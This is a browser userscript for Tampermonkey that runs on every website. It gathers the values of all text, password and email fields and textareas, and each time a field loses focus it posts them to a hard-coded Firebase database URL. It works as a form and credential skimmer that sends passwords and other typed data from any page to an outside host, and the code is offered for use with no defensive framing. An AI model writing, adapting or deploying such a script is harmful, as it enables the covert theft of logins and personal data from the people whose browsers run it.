
// ==UserScript==
// @name         Send All Text Field Values to Firebase
// @namespace    http://tampermonkey.net/
// @version      0.3
// @description  Collect all text field values and send to Firebase
// @author       You
// @match        *://*/*  // Adjust this to your needs
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Your Firebase Realtime Database URL
    const databaseURL = "https://chat-app-practice-82eff.firebaseio.com/user.json";


    // Function to send data to Firebase Realtime Database
    function sendData(data) {
        console.log('Sending data:', data); // Debug: Show data being sent
        fetch(databaseURL, {
            method: 'POST', // Use 'POST' to add new data
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log('Data sent successfully:', data);
        })
        .catch((error) => {
            console.error('Error sending data:', error);
        });
    }

    // Function to collect all text field values
    function collectTextFieldValues() {
        const textFields = document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"], textarea');
        const data = {};

        textFields.forEach(field => {
            const key = field.name || field.id || `field${Array.from(textFields).indexOf(field)}`;
            data[key] = field.value; // Capture the current value
        });

        return data;
    }

    // Collect values on blur event
    const textFields = document.querySelectorAll('input[type="text"], input[type="password"], input[type="email"], textarea');

    if (textFields.length > 0) {
        textFields.forEach(field => {
            // Listen for blur events
            field.addEventListener('blur', () => {
                const collectedData = collectTextFieldValues();
                if (Object.keys(collectedData).length > 0) {
                    sendData(collectedData);
                }
            });
        });
    } else {
        console.log('No text fields found.'); // Debug message
    }
})();